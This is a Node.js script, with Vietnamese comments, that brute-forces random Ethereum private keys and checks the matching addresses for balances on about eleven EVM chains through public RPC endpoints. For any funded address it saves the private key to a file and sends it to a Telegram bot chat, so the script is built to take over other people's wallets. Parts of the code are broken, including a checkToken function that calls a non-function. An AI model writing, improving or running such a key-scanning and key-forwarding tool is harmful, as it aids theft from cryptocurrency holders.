const { ethers, JsonRpcProvider } = require("ethers");
const axios = require("axios");
const fs = require("fs");
const settings = require("./settings.json");

const { log, error } = console;


function saveWallet(chain, private_key, address, balance) {
    const data = `${chain}\n${private_key}\n${address}\n${balance}`;
    fs.appendFileSync(`wallets/${chain}_${private_key}.txt`, data);
}

function alertTele(chain, private_key, address, balance) {
    const message = encodeURIComponent(
        `<code>test:\n - ${chain}
- Private Key: ${private_key}
- Địa chỉ ví: ${address}
- Số dư: ${balance}</code>`);
    const url = `https://api.telegram.org/bot${settings.tele.token}/sendMessage?chat_id=-${settings.tele.chatId}&text=${message}&parse_mode=html`;

    axios.post(url);
}

let loop = 0;

setInterval(() => {
    console.clear()
    log(loop)
}, 2000);

async function checkToken(coin, chain) {
chain.rpc()
}

async function scan(Chains) {
    const privateKey = [...Array(64)].map(() => (~~(Math.random() * 16)).toString(16)).join('');

    const wallet = new ethers.Wallet(privateKey);
    const address = await wallet.getAddress();
    loop++;

    Promise.all(Object.entries(Chains).map(([coin, chain]) => {
        if (Chains.hasOwnProperty(coin)) {
            return Chains[coin].rpc.getBalance(address).then(balance => {
                // log(coin, address, balance);
                if (balance > Chains[coin].min) {
                    log(`${coin}\nPrivate Key: ${privateKey}\nĐịa chỉ ví: ${address}\nSố dư: ${balance}`);
                    saveWallet(coin, privateKey, address, balance);
                    alertTele(coin, privateKey, address, balance);
                }

                // kiểm tra token
                checkToken(Chains[coin])

            }).catch(err => {
                error(coin, err.shortMessage);
            })
        }
    })).then(() => {
        scan(Chains)
    })
}

// Thay đổi số lượng luồng
const maxThread = settings.maxThread;
for (let i = 0; i < maxThread; i++) {

    const Chains = {
        "ETH": {
            "rpc": new JsonRpcProvider("https://eth.merkle.io"),
            "min": 50600000000000000n,
            tokens: {
                "WETH": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                "UNI": "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
                "CAKE": "0x152649eA73beAb28c5b49B26eb48f7EAD6d4c898",
                "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
                "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
                "WBTC": "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
                "WBNB": "0xB8c77482e45F1F44dE1745F52C74426C631bDD52"
            }
        },
        "BNB": {
            "rpc": new JsonRpcProvider("https://bsc-dataseed4.binance.org/"),
            "min": 0n,
            tokens: {
                "WBNB": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                "ETH": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
                "CAKE": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
                "UNI": "0xBf5140A22578168FD562DCcF235E5D43A02ce9B1",
                "USDT": "0x55d398326f99059fF775485246999027B3197955",
                "USDC": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
                "WBTC": "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c"
            }
        },
        // Add other chains here

        "AVAX": {
            "rpc": new JsonRpcProvider("https://avalanche.drpc.org"),
            "min": 0,
            tokens: {
                "WAVAX": "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7",
                "aAvaWAVAX": "0x6d80113e533a2C0fe82EaBD35f1875DcEA89Ea97",
                "WETH": "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB",
                "USDT": "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7",
                "USDC": "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E",
                "WBTC": "0x152b9d0FdC40C096757F570A51E494bd4b943E50"
            }
        },
        "CELO": {
            "rpc": new JsonRpcProvider("https://forno.celo.org"),
            "min": 0,
            tokens: {
                "WCELO": "0x471EcE3750Da237f93B8E339c536989b8978a438",
                "WETH": "0x122013fd7dF1C6F636a5bb8f03108E876548b455",
                "WBTC": "0xD629eb00dEced2a080B7EC630eF6aC117e614f1b",
                "USDT": "0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e",
                "USDC": "0xef4229c8c3250C675F21BCefa42f58EfbfF6002a",
                "USDC.e": "0x37f750B7cC259A2f741AF45294f6a16572CF5cAd",
                "CUSD": "0x765DE816845861e75A25fCA122bb6898B8B1282a",
                "G": "0x62B8B11039FcfE5aB0C56E502b1C372A3d2a9c7A",
            }
        },
        "FTM": {
            "rpc": new JsonRpcProvider("https://rpcapi.fantom.network"),
            "min": 0,
            tokens: {
                "fETH": "0x658b0c7613e890EE50B8C4BC6A3f41ef411208aD",
                "fBTC": "0xe1146b9AC456fCbB60644c36Fd3F868A9072fc6E",
                "WBTC": "0x321162Cd933E2Be498Cd2267a90534A804051b11",
                "USDC": "0x04068DA6C83AFCFA0e13ba15A6696662335D5B75",
            }
        },
        "MATIC": {
            "rpc": new JsonRpcProvider("https://polygon-rpc.com/"),
            "min": 0,
            tokens: {
                "WMATIC": "0x0000000000000000000000000000000000001010",
                "aPolWETH": "0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8",
                "USDT": "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
                "USDC": "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
            }
        },
        "ARB": {
            "rpc": new JsonRpcProvider("https://arb1.arbitrum.io/rpc"),
            "min": 0,
            tokens: {
                "WARB": "0x912CE59144191C1204E64559FE8253a0e49E6548",
                "WETH": "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",
                "UNI": "0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0",
                "USDT": "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
                "aArbUSDT": "0x6ab707Aca953eDAeFBc4fD23bA73294241490620",
                "USDC": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
                "USDC.e": "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
                "WBTC": "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f"
            }
        },
        "OP": {
            "rpc": new JsonRpcProvider("https://mainnet.optimism.io"),
            "min": 0,
            tokens: {
                "WOP": "0x4200000000000000000000000000000000000042",
                "WETH": "0x4200000000000000000000000000000000000006",
                "USDT": "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
                "USDC": "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",
                "USDC.e": "0x7F5c764cBc14f9669B88837ca1490cCa17c31607",
            }
        },
        "MANTA": {
            "rpc": new JsonRpcProvider("https://pacific-rpc.manta.network/http"),
            "min": 0,
            tokens: {
                "WMANTA": "0x95cef13441be50d20ca4558cc0a27b601ac544e5",
                "WETH": "0x0dc808adce2099a9f62aa87d9670745aba741746",
                "WBTC": "0x305e88d809c9dc03179554bfbf85ac05ce8f18d6",
                "USDC": "0xb73603c5d87fa094b7314c74ace2e64d165016fb",
                "USDT": "0xf417f5a458ec102b90352f697d6e2ac3a3d2851f",
            }
        },
        "BASE": {
            "rpc": new JsonRpcProvider("https://mainnet.base.org"),
            "min": 0,
            tokens: {
                "WETH": "0x4200000000000000000000000000000000000006",
                "DEGEN": "0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed",
                "USDC": "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
                "DAI": "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb",
                "USDbC": "0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA"
            }
        },
        "PLSX": {
            "rpc": new JsonRpcProvider("https://rpc.pulsechain.com"),
            "min": 0,
            tokens: {
                "WPLSX": "0x95B303987A60C71504D99Aa1b13B4DA07b0790ab",
                "WBTC": "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
                "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
                "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
                "DAI": "0x6B175474E89094C44Da98b954EedeAC495271d0F"
            }
        },
        // "CRO": {
        //     "rpc": new JsonRpcProvider("https://rpc.cronos.org/"),
        //     "min": 0
        // },
        // "KAVA": {
        //     "rpc": new JsonRpcProvider("https://evm.kava-rpc.com"),
        //     "min": 0,
        //     tokens: {
        //         "W": "",
        //         "WETH": "",
        //         "WBTC": "",
        //         "USDT": "",
        //         "USDC": "",
        //     }
        // },
        // "XDAI": {
        //     "rpc": new JsonRpcProvider("https://rpc.gnosis.gateway.fm"),
        //     "min": 0,
        //     tokens: {
        //         "W": "",
        //         "WETH": "",
        //         "WBTC": "",
        //         "USDT": "",
        //         "USDC": "",
        //     }
        // },
        // "GLMR": {
        //     "rpc": new JsonRpcProvider("https://rpc.api.moonbeam.network"),
        //     "min": 0,
        //     tokens: {
        //         "W": "",
        //         "WETH": "",
        //         "WBTC": "",
        //         "USDT": "",
        //         "USDC": "",
        //     }
        // },

        // : { 
        //     "rpc": new JsonRpcProvider(""),
        //     "min": 0
        // },
    };
    scan(Chains);
}


log(`Đang quét ${maxThread} luồng...`);
